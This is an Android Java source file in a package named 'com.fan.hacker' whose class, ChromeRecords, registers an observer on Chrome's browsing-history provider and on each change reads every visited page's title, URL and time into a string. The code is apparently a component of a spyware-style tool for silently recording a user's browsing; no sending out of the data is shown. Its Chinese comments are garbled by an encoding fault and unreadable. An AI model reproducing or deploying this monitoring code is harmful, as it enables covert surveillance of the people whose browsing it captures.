package com.fan.hacker;
/*ChromeRecords���ʹ�ð취��
 * private static String CHROME_BOOKMARKS_URI = "content://com.android.chrome.browser/history";
 * 		Handler mHandler =new Handler();
		ChromeOberver observer = new ChromeOberver(mHandler,this);
		getContentResolver().registerContentObserver(Uri.parse(CHROME_BOOKMARKS_URI), true, observer);
 * ע���ÿ����������ӷ����仯���������ChromeRecords���onChange()������
 * 
 * 
 * 
 * */
import java.sql.Date;
import java.text.SimpleDateFormat;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

public class ChromeRecords extends ContentObserver {
	private static String CHROME_BOOKMARKS_URI = "content://com.android.chrome.browser/history";
	private Context ctx;
	
	StringBuilder recordBuilder = new StringBuilder(); 
	public ChromeRecords(Handler handler) {
		super(handler);
		// TODO Auto-generated constructor stub
	}
	
	public ChromeRecords(Handler handler, Context ctx) {
		super(handler);
		this.ctx = ctx;
	}

	/* (non-Javadoc)
	 * @see android.database.ContentObserver#onChange(boolean)
	 * ������������������ÿ�θı�ʱ������ã���������ʹ��ʱ����Ҫ�趨һ�����
	 */
	@Override
    public void onChange(boolean selfChange) { 
        onChange(selfChange, null); 
    }    

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange);
        Log.d("ChromeRecords", "onChange: " + selfChange);

        Cursor cursor = ctx.getContentResolver().query(Uri.parse(CHROME_BOOKMARKS_URI), new String[]{"title", "url","date" },"bookmark = 0", null, null);

        // process cursor results
        while (cursor != null && cursor.moveToNext()) {  
            String url = null;  
            String title = null;  
            String time = null;  
            String date = null;  
  
            recordBuilder = new StringBuilder();  
            title = cursor.getString(cursor.getColumnIndex("title"));  
            url = cursor.getString(cursor.getColumnIndex("url"));  
  
            date = cursor.getString(cursor.getColumnIndex("date"));  
  
            SimpleDateFormat dateFormat = new SimpleDateFormat(  
                    "yyyy-MM-dd hh:mm;ss");  
            Date d = new Date(Long.parseLong(date));  
           time = dateFormat.format(d);  
            recordBuilder.append("���⣺"+title+";"+"���ӣ�"+url+";"+"ʱ�䣺"+time+";");
            System.out.println(title + url + time);  
        } 
    }
}
